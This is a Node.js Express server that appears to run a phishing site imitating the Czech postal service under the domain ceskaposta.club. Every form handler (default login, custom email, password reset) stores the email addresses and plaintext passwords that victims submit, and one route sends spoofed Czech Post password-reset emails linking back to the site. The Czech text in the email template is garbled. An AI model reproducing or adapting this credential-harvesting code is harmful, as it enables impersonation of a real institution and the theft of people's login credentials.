// import all libraries
const express = require("express")
const path = require("path")
const bodyParser = require("body-parser")
const { emitKeypressEvents } = require("readline")
const crypto = require("crypto")
const nodemailer = require("nodemailer")
require("dotenv").config()

// configure knex
const knex = require("knex")({
    client: "mysql2",
    connection: {
        host: process.env.MYSQL_HOST,
        port: process.env.MYSQL_PORT,
        user: process.env.MYSQL_USER,
        password: process.env.MYSQL_PASSWORD,
        database: process.env.MYSQL_DATABASE
    }
})

// init our app
const app = express()
const port = 8000;

// use static files renderer and bodyparser middleware
app.use(express.static("public"))
app.use(bodyParser.json())
app.use(bodyParser.urlencoded({ extended: true }))

//! GET paths
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "/public/index.html"))
})

app.get("/vlastni-email", (req, res) => {
    res.sendFile(path.join(__dirname, "/public/vlastni-email.html"))
})

app.get("/zapomenute-heslo", (req, res) => {
    res.sendFile(path.join(__dirname, "public/zapomenute-heslo.html"))
})

app.get("/zmenit-heslo", (req, res) => {
    res.sendFile(path.join(__dirname, "public/zmenit-heslo.html"))
})

//! POST paths
// default login form on index
app.post("/postDefaultLogin", (req, res) => {
    knex("defaultLogins").insert({
        email: req.body.email, password: req.body.password
    }).then((result) => {
        console.log("Default login OK")
        res.sendFile(path.join(__dirname, "public/dekujeme.html"))
    })
})

// reset password form
app.post("/zmenitHeslo", async (req, res) => {
    let randomString = crypto.randomBytes(8)
    randomString = randomString.toString('hex')

    let transporter = nodemailer.createTransport({
        host: process.env.MAIL_SERVER,
        port: 587,
        auth: {
            user: process.env.MAIL_USER,
            pass: process.env.MAIL_PASSWORD
        }
    })

    let info = await transporter.sendMail({
        from: "'Obnoven?? hesla ??esk?? Po??ta Club' <obnovahesla@ceskaposta.club>",
        to: req.body.email,
        subject: "Obnova hesla",
        html: `
            <img src="https://ceskaposta.club/img/banner2.png" />
            <br>
            <h1>Obnoven?? hesla ??esk?? po??ta club</h1>
            <p>
                Dobr?? den,
                pro obnoven?? hesla k ${req.body.email} pros??m klikn??te na tla????tko n????e.
            </p>
            <a href="https://ceskaposta.club/zmenit-heslo?id=${randomString}">
                <button style="background-color: #f7b802; border-color: #f7b802; border-radius: 3px; font-weight: bold;">Obnovit heslo</button>
            </a>
            <p>
                Pokud V??m tato zpr??va p??i??la omylem, m????ete ji smazat.
            </p>
            <p>
                S p????n??m hezk??ho dne,
                <br>
                <a href="https://ceskaposta.club/" style="color: #002776;">??esk?? po??ta club</a>
            </p>
        `
    })

    res.sendFile(path.join(__dirname, "public/email-odeslan.html"))

})

app.post("/postResetPassword", (req, res) => {
    knex("resetPassword").insert({
        email: req.body.email, password: req.body.password
    }).then((result) => {
        console.log("Reset password OK")
        res.sendFile(path.join(__dirname, "public/heslo-zmeneno.html"))
    })
})

// no cpost.cz email form
app.post("/postOwnEmail", (req, res) => {
    knex("customMail").insert({
        firstName: req.body.firstName,
        secondName: req.body.surname,
        email: req.body.email,
        postNumber: req.body.postNo,
        password: req.body.password
    }).then((result) => {
        console.log("Custom mail OK")
        res.sendFile(path.join(__dirname, "public/dekujeme.html"))
    })
})

// run the app
app.listen(port, process.env.EXTERNAL_IP, () => {
    console.log(`app on ${port}`)
})